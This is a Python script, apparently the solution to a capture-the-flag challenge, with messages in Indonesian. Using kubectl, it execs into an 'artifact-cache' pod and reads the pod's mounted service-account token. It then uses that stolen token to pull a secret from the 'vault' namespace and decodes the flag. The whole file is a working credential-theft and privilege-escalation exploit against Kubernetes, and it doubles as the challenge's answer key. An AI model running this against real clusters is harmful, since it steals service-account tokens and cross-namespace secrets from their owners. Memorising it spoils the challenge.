#!/usr/bin/env python3

import base64
import json
import os
import re
import subprocess
import sys
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent
KUBECONFIG = BASE_DIR / "kubeconfig.yaml"
NAMESPACE = "maintenance"
VAULT_NAMESPACE = "vault"


def run_kubectl(args, token=None):
    env = os.environ.copy()
    env["KUBECONFIG"] = str(KUBECONFIG)
    cmd = ["kubectl", "--request-timeout=10s"]
    if token:
        cmd.append(f"--token={token}")
    cmd.extend(args)
    try:
        result = subprocess.run(
            cmd,
            cwd=BASE_DIR,
            env=env,
            check=True,
            text=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            timeout=20,
        )
    except FileNotFoundError:
        sys.exit("kubectl tidak ditemukan di PATH")
    except subprocess.CalledProcessError as exc:
        sys.exit(f"kubectl gagal: {' '.join(cmd)}\n{exc.stderr.strip()}")
    except subprocess.TimeoutExpired:
        sys.exit(f"kubectl timeout: {' '.join(cmd)}")
    return result.stdout.strip()


def main():
    if not KUBECONFIG.exists():
        sys.exit(f"File tidak ditemukan: {KUBECONFIG}")

    pod = run_kubectl(
        [
            "get",
            "pod",
            "-n",
            NAMESPACE,
            "-l",
            "app=artifact-cache",
            "-o",
            "jsonpath={.items[0].metadata.name}",
        ]
    )
    if not pod:
        sys.exit("Pod artifact-cache tidak ditemukan")
    print(f"[+] artifact-cache pod: {pod}")

    release_token = run_kubectl(
        [
            "exec",
            "-n",
            NAMESPACE,
            pod,
            "-c",
            "cache",
            "--",
            "cat",
            "/var/run/secrets/kubernetes.io/serviceaccount/token",
        ]
    )
    print("[+] release-bot token diambil dari service account mount")

    secret_raw = run_kubectl(
        [
            "get",
            "secret",
            "relay-vault-entry",
            "-n",
            VAULT_NAMESPACE,
            "-o",
            "json",
        ],
        token=release_token,
    )
    secret = json.loads(secret_raw)
    flag = base64.b64decode(secret["data"]["flag"]).decode()

    if not re.fullmatch(r"uctf\{[0-9a-f]+\}", flag):
        sys.exit(f"Format flag tidak sesuai: {flag}")
    print(flag)


if __name__ == "__main__":
    main()
